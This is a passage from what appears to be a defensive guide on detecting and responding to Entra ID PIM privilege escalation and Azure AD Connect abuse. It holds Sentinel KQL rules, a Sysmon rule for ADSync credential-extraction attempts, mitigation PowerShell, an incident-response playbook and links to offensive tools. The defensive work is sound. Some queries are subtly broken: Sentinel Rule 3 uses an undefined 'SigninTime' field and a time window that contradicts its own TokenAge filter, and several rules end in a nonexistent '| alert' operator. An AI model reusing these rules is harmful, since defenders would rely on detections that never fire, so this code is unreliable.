| extend AADRoleDisplayName = tostring(TargetResources[0].displayName)
| extend AADRoleId = tostring(AdditionalDetails[0].value)
| extend AADUserAdded = tostring(TargetResources[2].displayName)
| extend InitiatedBy = tostring(InitiatedBy.user.userPrincipalName)
| project TimeGenerated, InitiatedBy, AADUserAdded, AADRoleDisplayName, Result
| where Result == "Success"
```

**What This Detects:**
- Direct role assignments that bypass PIM entirely
- These assignments should NEVER occur for privileged roles
- Attacker establishing persistence by creating Active (not Eligible) role assignments

### Sentinel Rule 2: Detect PIM Activation with Vague Justification

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to role completed (PIM activation)"
| extend Justification = tostring(InitiatedBy.user.justification)
| extend RoleName = tostring(TargetResources[0].displayName)
| extend User = tostring(InitiatedBy.user.userPrincipalName)
| where Justification in (".","activate", "work", "tasks", "test", "check", "temp", "quick")
| project TimeGenerated, User, RoleName, Justification
| alert
```

**What This Detects:**
- PIM activations with non-professional, vague, or suspicious justifications
- Pattern matching common placeholder text (indicates automated or careless attack)

### Sentinel Rule 3: Detect Session Token Hijacking Post-PIM Activation

**Applies To Versions:** All Entra ID (requires SigninLogs)

**KQL Query:**
```kusto
let pimActivations = AuditLogs
| where OperationName == "Add member to role completed (PIM activation)"
| extend ActivatingUser = tostring(InitiatedBy.user.userPrincipalName)
| extend ActivationTime = TimeGenerated
| project ActivatingUser, ActivationTime;
SigninLogs
| where TimeGenerated > ago(24h)
| extend User = UserPrincipalName
| join kind=inner (pimActivations) on $left.User == $right.ActivatingUser
| where SigninTime > ActivationTime - 5m and SigninTime < ActivationTime + 60m
| extend TokenAge = ActivationTime - SigninTime
| project TimeGenerated, User, AppDisplayName, ResourceDisplayName, TokenAge, IPAddress
| where TokenAge > 10m
| alert
```

**What This Detects:**
- Sign-in events immediately followed by PIM activation (suggests pre-established session token)
- Tokens that were established >10 minutes before activation (inconsistent with immediate re-auth)
- Pattern consistent with MITM/AiTM session token theft

---

## 10. EVENT LOG & WINDOWS AUDIT DETECTION

### Event ID Mapping

| Event ID | Source | Meaning | Attacker Behavior |
|---|---|---|---|
| 5136 | Directory Services (on-prem AD) | Attribute Modified | ADConnect writes password hash changes; attacker exploits this |
| 4662 | Security (on-prem AD) | Object Access (Audit Operation) | Directory Sync API calls modifying AD objects |
| 4768 / 4769 | Security (on-prem AD) | Kerberos Ticket-Granting Ticket (TGT) / Service Ticket | Post-PIM activation: TGT requested for elevated user account |
| 4624 | Security (on-prem AD) | Successful Logon | New service account logon using backdoor credentials |
| 4720 | Security (on-prem AD) | User Account Created | ADConnect or attacker creating new privileged accounts |

### Audit Rule Configuration

**On-Premises AD:**
```powershell
# Enable auditing for DN modification
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Monitor for MSOL account activity
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
```

**Azure AD / Entra ID:**
```powershell
# Audit logs are automatically captured; export to Log Analytics
# No additional configuration needed if Azure AD Premium P1+ is licensed
```

---

## 11. SYSMON DETECTION (On-Premises)

### Sysmon Rule: Monitor ADSync.exe Process Execution

**XML Rule:**
```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <Image condition="contains">ADSync.exe</Image>
      <CommandLine condition="contains">password</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <ParentImage condition="contains">ADSync</ParentImage>
      <Image condition="contains">powershell</Image>
    </ProcessCreate>
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">ADSync.mdf</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**What This Detects:**
- ADSync spawning PowerShell (unusual activity)
- Direct file access to the ADSync database (credential extraction attempt)

---

## 12. MITIGATIONS & INCIDENT RESPONSE

### Immediate Mitigation (0-24 hours)

1. **Force Global Administrator Re-authentication:**
   ```powershell
   # Revoke all sessions for suspected compromised Global Admin
   Get-MgUser -Filter "userPrincipalName eq 'compromised@company.onmicrosoft.com'" | Revoke-MgUserSigninSession
   ```

2. **Disable Suspicious Service Accounts:**
   ```powershell
   Update-MgUser -UserId "cloudservice@company.onmicrosoft.com" -AccountEnabled $false
   ```

3. **Review and Remove Unauthorized Role Assignments:**
   ```powershell
   Get-MgRoleManagementDirectoryRoleAssignment -Filter "roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'" | `
     Where-Object { $_.PrincipalId -notin $allowedAdmins } | Remove-MgRoleManagementDirectoryRoleAssignment
   ```

### Short-Term Mitigation (24-72 hours)

1. **Audit All PIM Role Assignments:**
   - Export PIM audit logs from Entra Admin Center → Identity Governance → Privileged Identity Management → Audit History
   - Review all "Add member to role" entries in last 30 days
   - Identify and remove unauthorized assignments

2. **Review Azure AD Connect Service Account:**
   ```powershell
   # List all accounts with Directory Synchronization role
   Get-MgDirectoryRole -Filter "displayName eq 'Directory Synchronization Accounts'" | Get-MgDirectoryRoleMember
   ```

3. **Enable Conditional Access Authentication Context for PIM:**
   - Create Conditional Access policy: Target "Privileged Identity Management" application
   - Require "Authentication Strength" = "Passwordless Sign-in"
   - Force re-authentication with stronger method than initial sign-in

### Long-Term Mitigation (1+ months)

1. **Implement Zero Trust Architecture:**
   - Migrate all admin accounts to cloud-native (not hybrid synced)
   - Implement device compliance checks for PIM activation
   - Use Azure AD Passwordless (Windows Hello for Business, FIDO2)

2. **Enforce Tier 0 Protection:**
   - Exclude all Tier 0 accounts and resources from directory synchronization
   - Use Privileged Identity Workstations (PIWs) for all admin activities
   - Implement Credential Guard on PIW devices

3. **Hardening PIM Configuration:**
   ```powershell
   # Ensure Global Admin role requires approval
   Update-MgBetaPolicyRoleManagementPolicy -PolicyId "DirectoryRole_62e90394-69f5-4237-9190-012177145e10" `
     -Rules @{
       Id = "Approval_EndUser_Assignment"
       IsEnabled = $true
       Target = @{ Caller = "EndUser"; Operations = @("All") }
       ApprovalRequired = $true
     }
   ```

### Incident Response Playbook

1. **Detection & Initial Response:**
   - SIEM alert → SOC acknowledges incident
   - Isolate compromised user account (disable, revoke sessions)
   - Preserve Azure AD audit logs (export to Log Analytics)

2. **Containment:**
   - Remove all unauthorized role assignments
   - Force password reset for all Global Admins
   - Reset MSOL account password and restart ADSync service

3. **Eradication:**
   - Delete all backdoor service accounts created during attack
   - Review M365 mailbox rules, forwarding rules, OAuth consents for persistence
   - Conduct full code review of any Azure Automation runbooks or Logic Apps

4. **Recovery:**
   - Restore administrator accounts from backup (pre-compromise)
   - Conduct credentials reset for all administrative accounts
   - Re-enable MFA for all admin accounts

5. **Post-Incident:**
   - Conduct forensic analysis of ADConnect logs
   - Review on-premises AD for unauthorized changes (user creation, group modifications)
   - Implement new alerting rules to prevent recurrence

---

## 13. REFERENCES & FURTHER READING

**Official Microsoft Documentation:**
- [Microsoft Entra Privileged Identity Management](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure)
- [Protect Microsoft 365 from On-Premises Attacks](https://learn.microsoft.com/en-us/entra/architecture/protect-m365-from-on-premises-attacks)
- [Microsoft Graph RoleManagement APIs](https://learn.microsoft.com/en-us/graph/api/resources/unifiedroledefinition)

**Security Research & CVEs:**
- [Tenable Research: Directory Synchronization Abuse](https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse)
- [Datadog Security Labs: Escalating to Entra Global Admin](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)
- [Cody Burkard: JIT Privilege Escalation](https://codyburkard.com/blog/jitprivilegeescalation/)

**Tools & PoCs:**
- [AADInternals - Hybrid AD Manipulation](https://github.com/Gerenios/AADInternals)
- [dirkjanm/adconnectdump - Credential Extraction](https://github.com/dirkjanm/adconnectdump)
- [Atomic Red Team T1098 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.003/T1098.003.md)

**Purple Teaming Resources:**
- [Trimarc Security: PIM Security Best Practices](https://www.hub.trimarcsecurity.com/post/demystifying-privileged-identity-management-part-1)
- [Campbell.scot: PIM Common Misconfigurations](https://campbell.scot/pim-common-microsoft-365-security-mistakes-series/)
- [Splunk: Azure AD PIM Role Assignment Detection](https://research.splunk.com/cloud/952e80d0-e343-439b-83f4-808c3e6fbf2e/)

---